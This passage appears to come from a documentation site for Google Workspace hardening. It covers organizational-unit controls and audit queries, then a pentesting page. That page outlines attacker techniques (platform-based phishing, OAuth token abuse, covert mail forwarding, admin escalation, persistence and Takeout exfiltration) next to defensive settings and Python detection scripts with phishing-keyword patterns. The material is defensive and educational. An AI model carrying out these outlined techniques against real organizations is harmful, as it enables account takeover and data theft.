controls:</p>"},{"location":"organizational-units/#root-level-controls-all-users","title":"Root-Level Controls (All Users)","text":"Security Control Implementation Rationale Password Policy Minimum 12 characters, complexity requirements Baseline security for all accounts Basic MFA Require 2-Step Verification Fundamental protection against account compromise Session Management Configure appropriate timeout settings Basic security hygiene Account Recovery Standardize recovery options Consistent recovery procedures Acceptable Use Apply organization-wide policies Baseline compliance"},{"location":"organizational-units/#enhanced-security-ou-controls","title":"Enhanced Security OU Controls","text":"Security Control Implementation Rationale Advanced MFA Require security keys Stronger protection for sensitive roles Access Context Implement context-aware access policies Adaptive security based on risk Device Management Require managed devices Control endpoint security Data Controls Implement stricter DLP policies Protect sensitive information External Sharing Restrict sharing capabilities Prevent data leakage"},{"location":"organizational-units/#high-security-ou-controls","title":"High-Security OU Controls","text":"Security Control Implementation Rationale Security Keys Only Enforce FIDO security keys Maximum authentication security Advanced Protection Enroll in Advanced Protection Program Comprehensive protection for critical accounts IP Restriction Limit access to specific networks Network-level access control Enhanced Auditing Implement comprehensive logging Detailed visibility for sensitive activities External Access Severely restrict external sharing Strict data boundary enforcement"},{"location":"organizational-units/#contractorexternal-ou-controls","title":"Contractor/External OU Controls","text":"Security Control Implementation Rationale Service Limitation Restrict access to necessary services only Minimize attack surface Data Access Controls Implement granular access controls Strict need-to-know access Extended Verification Additional authentication challenges Higher-risk accounts Time-Based Access Implement limited access windows Temporal privilege restriction Auto-Expiration Configure account expiration Automated deprovisioning"},{"location":"organizational-units/#best-practices-for-ou-security-implementation","title":"Best Practices for OU Security Implementation","text":""},{"location":"organizational-units/#1-ou-migration-planning","title":"1. OU Migration Planning","text":"<p>When implementing or restructuring OUs:</p> <ol> <li>Assessment Phase</li> <li>Document current state including users, groups, and policies</li> <li>Identify security gaps in existing structure</li> <li> <p>Define security objectives for new structure</p> </li> <li> <p>Design Phase</p> </li> <li>Create comprehensive OU diagram with security boundaries</li> <li>Define inheritance model and override points</li> <li> <p>Document policy application by OU level</p> </li> <li> <p>Testing Phase</p> </li> <li>Validate policy inheritance in test environment</li> <li>Verify administrative boundaries function as expected</li> <li> <p>Test user experience for each OU level</p> </li> <li> <p>Implementation Phase</p> </li> <li>Develop staged migration plan</li> <li>Create communication plan for affected users</li> <li>Implement controlled rollout with validation</li> </ol>"},{"location":"organizational-units/#2-ou-security-governance","title":"2. OU Security Governance","text":"<p>Establish governance processes for OU management:</p> <ol> <li>Documentation Requirements</li> <li>Maintain up-to-date OU structure documentation</li> <li>Document security baselines for each OU level</li> <li> <p>Maintain policy exception register</p> </li> <li> <p>Change Control</p> </li> <li>Implement formal change process for OU structure modifications</li> <li>Require security review for policy changes</li> <li> <p>Maintain audit trail of structural changes</p> </li> <li> <p>Regular Review Cycle</p> </li> <li>Conduct quarterly OU structure reviews</li> <li>Validate security control effectiveness</li> <li> <p>Assess user placement appropriateness</p> </li> <li> <p>Compliance Mapping</p> </li> <li>Document how OU structure supports compliance requirements</li> <li>Map controls to regulatory frameworks</li> <li>Validate compliance control effectiveness</li> </ol>"},{"location":"organizational-units/#3-ou-administrative-model","title":"3. OU Administrative Model","text":"<p>Implement a secure administrative model for OU management:</p> <ol> <li>Role-Based Administration</li> <li>Define administrative roles aligned with OU structure</li> <li>Implement least privilege for admin accounts</li> <li> <p>Create separation of duties between admin functions</p> </li> <li> <p>Delegated Administration</p> </li> <li>Delegate specific admin functions to appropriate teams</li> <li>Scope admin access to specific OUs</li> <li> <p>Implement strict controls for root-level administration</p> </li> <li> <p>Administrative Monitoring</p> </li> <li>Log all administrative actions at OU level</li> <li>Implement alerting for critical OU changes</li> <li> <p>Conduct regular admin access reviews</p> </li> <li> <p>Emergency Access Procedures</p> </li> <li>Define break-glass procedures for emergency access</li> <li>Create secure process for emergency OU changes</li> <li>Implement post-incident review requirements</li> </ol>"},{"location":"organizational-units/#advanced-ou-security-techniques","title":"Advanced OU Security Techniques","text":""},{"location":"organizational-units/#dynamic-ou-assignment","title":"Dynamic OU Assignment","text":"<p>Implement rule-based user assignment to OUs:</p> <ol> <li>Attribute-Based Assignment</li> <li>Develop automation to assign users based on HR attributes</li> <li>Create rules for department, role, or location-based assignment</li> <li> <p>Implement review process for assignment exceptions</p> </li> <li> <p>Risk-Based OU Movement</p> </li> <li>Develop criteria for moving users between security tiers</li> <li>Implement automated risk scoring</li> <li> <p>Create process for handling high-risk user indicators</p> </li> <li> <p>Temporary Elevation</p> </li> <li>Design process for temporary OU reassignment</li> <li>Implement time-bound access to higher-privilege OUs</li> <li>Create audit mechanisms for tracking temporary changes</li> </ol>"},{"location":"organizational-units/#security-inheritance-controls","title":"Security Inheritance Controls","text":"<p>Implement advanced inheritance management:</p> <ol> <li>Inheritance Documentation</li> <li>Map all inheritance overrides across OU structure</li> <li>Document business justification for inheritance blocks</li> <li> <p>Maintain visualization of inheritance relationships</p> </li> <li> <p>Inheritance Monitoring</p> </li> <li>Create alerts for critical inheritance changes</li> <li>Implement regular validation of inheritance configuration</li> <li> <p>Develop reports highlighting inheritance exceptions</p> </li> <li> <p>Compliance Inheritance</p> </li> <li>Implement specialized inheritance rules for compliance requirements</li> <li>Create compliance-specific OUs where necessary</li> <li>Document inheritance implications for auditors</li> </ol>"},{"location":"organizational-units/#msp-specific-ou-strategies","title":"MSP-Specific OU Strategies","text":""},{"location":"organizational-units/#multi-tenant-ou-management","title":"Multi-Tenant OU Management","text":"<p>For MSPs managing multiple client environments:</p> <ol> <li>Client Isolation</li> <li>Implement strict boundaries between client OUs</li> <li>Create separate administrative accounts per client</li> <li> <p>Configure distinct security baselines by client</p> </li> <li> <p>Standardized Substructures</p> </li> <li>Develop templated OU structures for new clients</li> <li>Create standard security tiers applicable across clients</li> <li> <p>Implement consistent naming conventions</p> </li> <li> <p>Cross-Client Visibility</p> </li> <li>Design appropriate MSP admin visibility across clients</li> <li>Implement security monitoring across OU boundaries</li> <li>Create aggregated reporting capabilities</li> </ol>"},{"location":"organizational-units/#client-onboarding-procedures","title":"Client Onboarding Procedures","text":"<p>Establish secure client implementation processes:</p> <ol> <li>OU Structure Design</li> <li>Conduct client security requirements workshop</li> <li>Design appropriate OU structure based on needs</li> <li> <p>Document client-specific security requirements</p> </li> <li> <p>Security Baseline Implementation</p> </li> <li>Apply appropriate tier-based security controls</li> <li>Configure custom policies as required</li> <li> <p>Implement client-specific exceptions with documentation</p> </li> <li> <p>Administrative Delegation</p> </li> <li>Configure appropriate client admin access</li> <li>Establish MSP admin boundaries</li> <li>Document administrative responsibilities</li> </ol>"},{"location":"organizational-units/#common-ou-security-misconfigurations","title":"Common OU Security Misconfigurations","text":""},{"location":"organizational-units/#anti-pattern-1-flat-ou-structure","title":"Anti-Pattern 1: Flat OU Structure","text":"<p>Issue: Using minimal OUs with extensive exceptions Risk: Inconsistent policy application, excessive administrative overhead Remediation: - Implement hierarchical structure based on security requirements - Group users with similar security needs - Apply exceptions at appropriate OU levels rather than individually</p>"},{"location":"organizational-units/#anti-pattern-2-excessive-ou-depth","title":"Anti-Pattern 2: Excessive OU Depth","text":"<p>Issue: Creating unnecessary levels of OU nesting Risk: Complex management, inheritance problems, troubleshooting difficulties Remediation: - Limit OU depth to 3-4 levels when possible - Focus on functional rather than organizational depth - Document inheritance clearly for deep structures</p>"},{"location":"organizational-units/#anti-pattern-3-inconsistent-inheritance","title":"Anti-Pattern 3: Inconsistent Inheritance","text":"<p>Issue: Unpredictable blocking of inherited settings Risk: Security gaps, unintended policy application Remediation: - Document all inheritance overrides - Implement review process for inheritance changes - Regularly audit effective settings at leaf OUs</p>"},{"location":"organizational-units/#anti-pattern-4-administrative-boundary-failures","title":"Anti-Pattern 4: Administrative Boundary Failures","text":"<p>Issue: Improper scoping of administrative access Risk: Privilege escalation, unauthorized access to sensitive OUs Remediation: - Implement strict administrative boundaries - Regularly review admin access scope - Audit administrative actions across boundaries</p>"},{"location":"organizational-units/#implementation-checklist","title":"Implementation Checklist","text":""},{"location":"organizational-units/#initial-ou-security-setup","title":"Initial OU Security Setup","text":"<ul> <li> Document business requirements for OU structure</li> <li> Design OU hierarchy based on security needs</li> <li> Define security policies for each OU level</li> <li> Create OU structure in test environment</li> <li> Validate policy inheritance works as expected</li> <li> Implement administrative boundaries</li> <li> Document and review with stakeholders</li> <li> Migrate users to appropriate OUs</li> </ul>"},{"location":"organizational-units/#regular-maintenance-tasks","title":"Regular Maintenance Tasks","text":"<ul> <li> Quarterly review of OU structure</li> <li> Audit of user OU placements</li> <li> Verification of policy inheritance</li> <li> Review of administrative access</li> <li> Validation of security control effectiveness</li> <li> Update of OU documentation</li> <li> Assessment of potential structure improvements</li> </ul>"},{"location":"organizational-units/#security-monitoring-for-ous","title":"Security Monitoring for OUs","text":""},{"location":"organizational-units/#critical-events-to-monitor","title":"Critical Events to Monitor","text":"Event Type Description Risk Indication OU Creation/Deletion New OUs being created or removed Potential structure manipulation OU Moving OUs being relocated in hierarchy Inheritance changes, potential policy bypass User Moving Users moving between OUs Security policy changes, potential privilege change Inheritance Override Changes to policy inheritance Potential security control bypass Admin Privilege Changes Changes to admin access for OUs Potential privilege escalation"},{"location":"organizational-units/#sample-monitoring-queries","title":"Sample Monitoring Queries","text":"<p>Detecting Unusual OU Changes: <pre><code>SELECT admin_email, event_type, target_ou_name, timestamp\nFROM admin_audit_logs\nWHERE event_type IN ('CREATE_OU', 'DELETE_OU', 'MOVE_OU')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\n  AND admin_email NOT IN (SELECT admin_email FROM authorized_ou_admins)\nORDER BY timestamp DESC\n</code></pre></p> <p>Monitoring High-Risk User Movement: <pre><code>SELECT admin_email, affected_user_email, \n       source_ou_path, destination_ou_path, timestamp\nFROM admin_audit_logs\nWHERE event_type = 'MOVE_USER'\n  AND (\n    -- Moving from restricted to less restricted\n    (source_ou_path LIKE '%/HighSecurity/%' AND destination_ou_path NOT LIKE '%/HighSecurity/%')\n    OR\n    -- Moving to administrative OUs\n    (destination_ou_path LIKE '%/Admin/%')\n  )\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> <p>Tracking Inheritance Changes: <pre><code>SELECT admin_email, target_ou_path, setting_name, \n       old_value, new_value, timestamp\nFROM admin_audit_logs\nWHERE event_type = 'CHANGE_SETTING_INHERITANCE'\n  AND setting_name IN ('Password Strength', 'Two Factor Authentication', 'Access Controls', 'Data Controls')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p>"},{"location":"organizational-units/#resources","title":"Resources","text":"<ul> <li>Google Workspace Admin Help: Organizational Units</li> <li>Google Workspace Admin SDK: Directory API</li> <li>Google Cloud Platform Resource Hierarchy</li> <li>NIST SP 800-53: Access Control</li> </ul> <p>Note: This guide should be adapted to your organization's specific needs, size, and security requirements.</p>"},{"location":"pentesting-insights/","title":"Pentesting Insights","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"pentesting-insights/#google-workspace-pentesting-insights-and-defensive-countermeasures","title":"Google Workspace: Pentesting Insights and Defensive Countermeasures","text":"<p>This guide integrates adversarial perspectives into our security approach, drawing from pentesting techniques to strengthen Google Workspace security posture. Understanding attack methodologies is essential for implementing effective defenses.</p> <p>Attribution: This guide incorporates insights and methodologies from the excellent HackTricks Google Workspace Security Guide, Google Workspace Post-Exploitation Guide, Google Workspace Persistence Techniques, Workspace Sync Attacks, and Google Platforms Phishing. We highly recommend reviewing the original resources for additional offensive security perspectives.</p>"},{"location":"pentesting-insights/#common-attack-vectors-and-defensive-strategies","title":"Common Attack Vectors and Defensive Strategies","text":""},{"location":"pentesting-insights/#google-platform-specific-phishing-techniques","title":"Google Platform-Specific Phishing Techniques","text":""},{"location":"pentesting-insights/#attack-methodology","title":"Attack Methodology","text":"<p>Attackers leverage Google's own platforms to create sophisticated phishing campaigns:</p> <ol> <li>Google Groups Phishing</li> <li>Create Google Groups with legitimate-looking names</li> <li>Invite target users to join these groups</li> <li>Send emails from legitimate Google addresses</li> <li>Leverage group communication for payload delivery</li> <li> <p>Exploit trust in Google's infrastructure</p> </li> <li> <p>Google Chat Phishing</p> </li> <li>Initiate chat conversations with targets</li> <li>Create deceptive Spaces mimicking official support channels</li> <li>Send malicious links within chat conversations</li> <li>Exploit real-time nature for urgent action requests</li> <li> <p>Use Google's legitimate notification system</p> </li> <li> <p>Google Calendar Phishing</p> </li> <li>Create calendar invitations with embedded phishing links</li> <li>Configure events with short notice to create urgency</li> <li>Add malicious content in event descriptions and attachments</li> <li>Hide attendee lists to prevent cross-checking</li> <li> <p>Disable email notifications to avoid scrutiny</p> </li> <li> <p>App Scripts Redirect Phishing</p> </li> <li>Create malicious web apps on script.google.com</li> <li>Implement JavaScript redirects to phishing sites</li> <li>Leverage legitimate Google domains (script.google.com)</li> <li>Create URL parameters to customize phishing experience</li> <li> <p>Evade URL filtering by using trusted Google domains</p> </li> <li> <p>OAuth App Phishing</p> </li> <li>Create applications requesting excessive permissions</li> <li>Design convincing application names and descriptions</li> <li>Craft targeted permission requests based on victim role</li> <li>Exploit user tendency to authorize Google-hosted applications</li> <li>Obtain persistent access through authorized OAuth tokens</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures","title":"Defensive Countermeasures","text":"<ol> <li> <p>Google Groups Security Controls <pre><code>Admin Console &gt; Groups &gt; Groups settings\n- Configure \"Who can create groups\"\n- Set \"Restrict group creation\"\n- Implement group creation approval workflow\n- Configure external sharing restrictions\n</code></pre></p> </li> <li> <p>Google Chat Security Settings <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Google Chat\n- Configure \"Chat with external users\"\n- Set appropriate \"External chat invites\" settings\n- Implement URL scanning in chat messages\n- Configure appropriate Space creation permissions\n</code></pre></p> </li> <li> <p>Calendar Security Controls <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Calendar\n- Configure \"Sharing options\" to restrict external sharing\n- Set \"External invitations\" policy\n- Enable \"Event scanning\" for malicious content\n- Restrict automatic addition of external events\n</code></pre></p> </li> <li> <p>App Scripts Security Management <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App Scripts\n- Configure \"Google Cloud Platform (GCP) trust\"\n- Restrict Apps Script application deployment\n- Implement appropriate Apps Script Marketplace controls\n- Configure allowlist for trusted scripts\n</code></pre></p> </li> <li> <p>Cross-Platform Security Education</p> </li> <li>Develop user training specific to Google platform phishing</li> <li>Create visual guides for Google-specific phishing indicators</li> <li>Implement simulated phishing using Google platforms</li> <li> <p>Establish clear reporting procedures for suspicious activities</p> </li> <li> <p>Detection and Monitoring <pre><code># Python script to detect suspicious Google platform activities\ndef detect_google_platform_phishing(reports_service):\n    \"\"\"Monitor for potentially suspicious Google platform activities\"\"\"\n    # Check for suspicious group creation\n    group_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='groups',\n        eventName='CREATE_GROUP',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activities = []\n    \n    # Analyze groups creation\n    for event in group_events.get('items', []):\n        # Extract group details\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        group_name = next((p.get('value') for p in parameters \n                           if p.get('name') == 'group_name'), '')\n        \n        # Check for suspicious group names\n        suspicious_terms = ['support', 'security', 'helpdesk', 'admin', 'it-team', 'password']\n        if any(term in group_name.lower() for term in suspicious_terms):\n            suspicious_activities.append({\n                'user': event['actor']['email'],\n                'activity': 'suspicious_group_creation',\n                'details': f\"Created potentially deceptive group: {group_name}\",\n                'ip_address': event.get('ipAddress'),\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    # Check for suspicious calendar events\n    calendar_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='calendar',\n        eventName='CREATE_EVENT',\n        maxResults=1000\n    ).execute()\n    \n    for event in calendar_events.get('items', []):\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        event_title = next((p.get('value') for p in parameters \n                            if p.get('name') == 'event_title'), '')\n        event_description = next((p.get('value') for p in parameters \n                                  if p.get('name') == 'event_description'), '')\n        \n        # Check for suspicious calendar activity\n        if contains_suspicious_content(event_title) or contains_suspicious_content(event_description):\n            suspicious_activities.append({\n                'user': event['actor']['email'],\n                'activity': 'suspicious_calendar_event',\n                'details': f\"Created potentially malicious calendar event: {event_title}\",\n                'ip_address': event.get('ipAddress'),\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    return suspicious_activities\n\ndef contains_suspicious_content(text):\n    \"\"\"Check if content contains suspicious patterns\"\"\"\n    suspicious_patterns = [\n        r'password.*reset',\n        r'security.*alert',\n        r'account.*verify',\n        r'login.*required',\n        r'unusual.*activity',\n        r'http[s]?://(?!.*google\\.com)[^\\s]+',  # Non-Google URLs\n        r'urgent',\n        r'immediate.*action'\n    ]\n    \n    return any(re.search(pattern, text.lower()) for pattern in suspicious_patterns)\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#1-oauth-based-attacks","title":"1. OAuth-Based Attacks","text":""},{"location":"pentesting-insights/#attack-methodology_1","title":"Attack Methodology","text":"<p>Attackers frequently target Google Workspace through OAuth-based attacks:</p> <ol> <li>OAuth Phishing Campaigns</li> <li>Create malicious applications requesting extensive permissions</li> <li>Design convincing phishing emails with OAuth authorization links</li> <li> <p>Persuade users to authorize deceptive applications</p> </li> <li> <p>Application Permission Abuse</p> </li> <li>Request overly broad scopes (Gmail, Drive, Admin access)</li> <li>Exploit insufficient OAuth app verification requirements</li> <li> <p>Use legitimate-looking application names and logos</p> </li> <li> <p>Token Theft and Abuse</p> </li> <li>Target OAuth refresh tokens for long-term persistent access</li> <li>Use stolen tokens to access services without triggering login alerts</li> <li>Bypass MFA through pre-authenticated token usage</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_1","title":"Defensive Countermeasures","text":"<ol> <li> <p>OAuth Application Control <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Configure to \"Only allow trusted applications\"\n- Implement allowlisting for approved applications\n- Block applications requesting sensitive scopes\n</code></pre></p> </li> <li> <p>Advanced Token Monitoring <pre><code># Python script for suspicious token activity monitoring\ndef detect_suspicious_token_activity(admin_sdk_service, reports_service):\n    \"\"\"Monitor for suspicious OAuth token activity\"\"\"\n    # Get token usage events\n    token_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='token',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activity = []\n    for event in token_events.get('items', []):\n        # Check for suspicious patterns\n        if is_suspicious_token_activity(event):\n            suspicious_activity.append({\n                'user': event['actor']['email'],\n                'application': event.get('events', [{}])[0].get('name', 'Unknown'),\n                'scopes': extract_scopes(event),\n                'ip_address': event.get('ipAddress'),\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    return suspicious_activity\n\ndef is_suspicious_token_activity(event):\n    \"\"\"Determine if token activity is suspicious based on various signals\"\"\"\n    # Extract relevant data\n    events = event.get('events', [{}])\n    if not events:\n        return False\n        \n    event_data = events[0]\n    \n    # Check for sensitive scopes\n    scopes = extract_scopes(event)\n    sensitive_scope_indicators = ['mail', 'gmail', 'admin', 'directory']\n    has_sensitive_scopes = any(indicator in str(scopes).lower() \n                               for indicator in sensitive_scope_indicators)\n    \n    # Check for suspicious parameters\n    parameters = event_data.get('parameters', [])\n    client_id = next((p.get('value') for p in parameters \n                     if p.get('name') == 'client_id'), None)\n    \n    # Check if client ID is not in our approved list\n    approved_clients = get_approved_client_ids()\n    unknown_client = client_id not in approved_clients\n    \n    # Suspicious if sensitive scopes AND unknown client\n    return has_sensitive_scopes and unknown_client\n\ndef extract_scopes(event):\n    \"\"\"Extract OAuth scopes from event data\"\"\"\n    events = event.get('events', [{}])\n    if not events:\n        return []\n        \n    parameters = events[0].get('parameters', [])\n    for param in parameters:\n        if param.get('name') == 'scope':\n            return param.get('value', '').split()\n    \n    return []\n</code></pre></p> </li> <li> <p>Advanced OAuth Governance</p> </li> <li>Implement routine OAuth application reviews</li> <li>Develop OAuth risk scoring based on requested scopes</li> <li>Create user education focused on OAuth authorization risks</li> </ol>"},{"location":"pentesting-insights/#2-email-based-attack-vectors","title":"2. Email-Based Attack Vectors","text":""},{"location":"pentesting-insights/#attack-methodology_2","title":"Attack Methodology","text":"<p>Email remains a primary attack vector for Google Workspace:</p> <ol> <li>Lateral Phishing</li> <li>Compromise one account and use it to phish others in the organization</li> <li>Leverage existing trust relationships and conversation threads</li> <li> <p>Target high-value accounts based on internal information</p> </li> <li> <p>Email Filter/Forwarding Abuse</p> </li> <li>Create covert mail forwarding rules after account compromise</li> <li>Set up filters to hide specific messages from user view</li> <li> <p>Establish persistent access to communications</p> </li> <li> <p>Mailbox Delegation Exploitation</p> </li> <li>Add unauthorized delegates to compromised mailboxes</li> <li>Use delegation to maintain access even after password changes</li> <li>Access sensitive communications without generating alerts</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_2","title":"Defensive Countermeasures","text":"<ol> <li> <p>Enhanced Email Monitoring <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Email logs\n- Configure alerts for suspicious mail filter creation\n- Monitor for unusual delegation activity\n- Implement forwarding restrictions\n</code></pre></p> </li> <li> <p>Mail Flow Rule Restrictions <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Routing\n- Restrict external auto-forwarding\n- Require administrator approval for mail delegation\n- Implement group-based restrictions for sensitive departments\n</code></pre></p> </li> <li> <p>Mail Security Intelligence <pre><code># Python script for identifying suspicious email rules\ndef detect_suspicious_email_rules(admin_sdk_service, reports_service):\n    \"\"\"Detect suspicious email rules and filters\"\"\"\n    # Get Gmail configuration events\n    mail_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='gmail',\n        eventName='EMAIL_FORWARDING_CHANGE,EMAIL_FILTER_CREATION',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_rules = []\n    for event in mail_events.get('items', []):\n        # Extract event details\n        event_name = event.get('events', [{}])[0].get('name')\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        \n        # Check if this is a suspicious rule\n        if event_name == 'EMAIL_FORWARDING_CHANGE':\n            forwarding_address = next((p.get('value') for p in parameters \n                                      if p.get('name') == 'forwarding_address'), None)\n            \n            # Check if forwarding to external domain\n            if forwarding_address and not is_internal_domain(forwarding_address):\n                suspicious_rules.append({\n                    'user': event['actor']['email'],\n                    'type': 'forwarding',\n                    'destination': forwarding_address,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n                \n        elif event_name == 'EMAIL_FILTER_CREATION':\n            filter_criteria = next((p.get('value') for p in parameters \n                                   if p.get('name') == 'filter_criteria'), None)\n            filter_action = next((p.get('value') for p in parameters \n                                 if p.get('name') == 'filter_action'), None)\n            \n            # Check for suspicious filter patterns\n            if is_suspicious_filter(filter_criteria, filter_action):\n                suspicious_rules.append({\n                    'user': event['actor']['email'],\n                    'type': 'filter',\n                    'criteria': filter_criteria,\n                    'action': filter_action,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_rules\n\ndef is_internal_domain(email_address):\n    \"\"\"Check if the email belongs to an internal domain\"\"\"\n    internal_domains = ['company.com', 'subsidiary.company.com']  # Your domains\n    for domain in internal_domains:\n        if email_address.endswith('@' + domain):\n            return True\n    return False\n\ndef is_suspicious_filter(criteria, action):\n    \"\"\"Determine if a filter is potentially suspicious\"\"\"\n    suspicious_indicators = False\n    \n    # Suspicious if hiding emails from specific senders\n    if 'from:' in criteria and 'trash' in action.lower():\n        suspicious_indicators = True\n        \n    # Suspicious if forwarding to external address\n    if 'forward' in action.lower() and not is_internal_domain(action.split(' ')[-1]):\n        suspicious_indicators = True\n        \n    # Suspicious if archiving or marking as read security-related emails\n    if any(term in criteria.lower() for term in ['security', 'password', 'verification']):\n        if any(term in action.lower() for term in ['archive', 'mark_as_read']):\n            suspicious_indicators = True\n    \n    return suspicious_indicators\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#3-admin-account-targeting","title":"3. Admin Account Targeting","text":""},{"location":"pentesting-insights/#attack-methodology_3","title":"Attack Methodology","text":"<p>Administrator accounts are primary targets due to their elevated privileges:</p> <ol> <li>Admin Role Privilege Escalation</li> <li>Target accounts with limited admin privileges</li> <li>Escalate permissions through role modification</li> <li> <p>Create persistence through new admin accounts</p> </li> <li> <p>Super Admin Account Targeting</p> </li> <li>Focus phishing and social engineering on super admin accounts</li> <li>Utilize session hijacking to access admin console</li> <li> <p>Make subtle changes to avoid detection</p> </li> <li> <p>Recovery Email Manipulation</p> </li> <li>Modify account recovery options for persistence</li> <li>Change recovery email to attacker-controlled address</li> <li>Use recovery process to regain access after remediation</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_3","title":"Defensive Countermeasures","text":"<ol> <li> <p>Enhanced Admin Security <pre><code>Admin Console &gt; Security &gt; Authentication &gt; Advanced Protection Program\n- Enroll all administrators in APP\n- Require hardware security keys\n- Implement IP-based restrictions for admin access\n</code></pre></p> </li> <li> <p>Admin Activity Monitoring <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Admin\n- Create alerts for administrative role changes\n- Monitor account recovery modifications\n- Implement real-time alerting for critical setting changes\n</code></pre></p> </li> <li> <p>Admin Access Control Framework</p> </li> <li>Implement strict separation of duties</li> <li>Require multi-party authorization for critical changes</li> <li>Create time-bound administrative access</li> <li>Implement enhanced logging for all admin actions</li> </ol>"},{"location":"pentesting-insights/#4-persistence-mechanisms","title":"4. Persistence Mechanisms","text":""},{"location":"pentesting-insights/#attack-methodology_4","title":"Attack Methodology","text":"<p>Attackers use various persistence techniques to maintain access:</p> <ol> <li>Service Account Key Abuse</li> <li>Create or steal service account keys with elevated privileges</li> <li>Use keys for programmatic API access</li> <li> <p>Maintain access independent of user credentials</p> </li> <li> <p>GCDS (Google Cloud Directory Sync) Exploitation</p> </li> <li>Target directory synchronization configurations</li> <li>Modify sync rules to create or preserve access</li> <li> <p>Leverage trusted synchronization channels</p> </li> <li> <p>Workspace Add-on Persistence</p> </li> <li>Create malicious Workspace add-ons</li> <li>Deploy via compromised admin accounts</li> <li>Establish persistence through authorized applications</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_4","title":"Defensive Countermeasures","text":"<ol> <li> <p>Service Account Security <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide Delegation\n- Strictly limit service account permissions\n- Implement key rotation requirements\n- Conduct regular audits of delegated access\n</code></pre></p> </li> <li> <p>Synchronization Security <pre><code>Admin Console &gt; Directory &gt; Directory settings\n- Implement secure GCDS configuration\n- Restrict synchronization permissions\n- Monitor synchronization logs for anomalies\n</code></pre></p> </li> <li> <p>Add-on Security Controls <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Restrict add-on installation capabilities\n- Implement add-on allowlisting\n- Conduct security reviews for all add-ons\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#5-data-exfiltration-techniques","title":"5. Data Exfiltration Techniques","text":""},{"location":"pentesting-insights/#attack-methodology_5","title":"Attack Methodology","text":"<p>Attackers use multiple methods to extract sensitive data:</p> <ol> <li>Google Takeout Exploitation</li> <li>Use Google Takeout to extract complete data archives</li> <li>Extract bulk data without triggering DLP alerts</li> <li> <p>Obtain comprehensive data snapshots</p> </li> <li> <p>Drive Share Manipulation</p> </li> <li>Share sensitive documents with external accounts</li> <li>Use sharing links with minimal visibility</li> <li> <p>Create copies in personal accounts</p> </li> <li> <p>API-Based Exfiltration</p> </li> <li>Use API access to extract data programmatically</li> <li>Stay under rate limits and detection thresholds</li> <li>Extract targeted data across multiple services</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_5","title":"Defensive Countermeasures","text":"<ol> <li> <p>Takeout Restrictions <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Settings for data access\n- Restrict Google Takeout capabilities\n- Implement approval workflows for data exports\n- Enable alerts for bulk data downloads\n</code></pre></p> </li> <li> <p>Enhanced DLP Implementation <pre><code>Admin Console &gt; Security &gt; Data protection\n- Configure comprehensive DLP policies\n- Implement content-aware access restrictions\n- Deploy sharing controls based on content classification\n</code></pre></p> </li> <li> <p>API Access Monitoring</p> </li> <li>Implement API access monitoring and limiting</li> <li>Create behavioral baselines for API usage</li> <li>Deploy anomaly detection for unusual data access patterns</li> </ol>"},{"location":"pentesting-insights/#post-exploitation-techniques","title":"Post-Exploitation Techniques","text":"<p>Understanding post-exploitation techniques is critical for effective defense. These methodologies highlight how attackers maintain access and extract data after initial compromise.</p>"},{"location":"pentesting-insights/#data-exfiltration-methods","title":"Data Exfiltration Methods","text":""},{"location":"pentesting-insights/#attack-methodology_6","title":"Attack Methodology","text":"<p>Sophisticated attackers use several techniques to extract data from Google Workspace:</p> <ol> <li>Google Takeout Exploitation</li> <li>Navigate to https://takeout.google.com after account compromise</li> <li>Extract complete account data archives across all services</li> <li>Download bulk data without triggering traditional DLP alerts</li> <li> <p>Extract historical content that may not be visible in typical interfaces</p> </li> <li> <p>Google Vault Extraction</p> </li> <li>Leverage Google Vault (if enabled) to export user content</li> <li>Use eDiscovery capabilities to search across multiple users</li> <li>Extract content from multiple services in single operation</li> <li> <p>Bypass service-specific export limitations</p> </li> <li> <p>Targeted Data Mining</p> </li> <li>Use Google Cloud Search to find sensitive content across services</li> <li>Extract contacts from https://contacts.google.com</li> <li>Mine Google Chat for sensitive information or credentials</li> <li>Search Google Keep notes for recorded credentials or sensitive data</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_6","title":"Defensive Countermeasures","text":"<ol> <li> <p>Takeout and Export 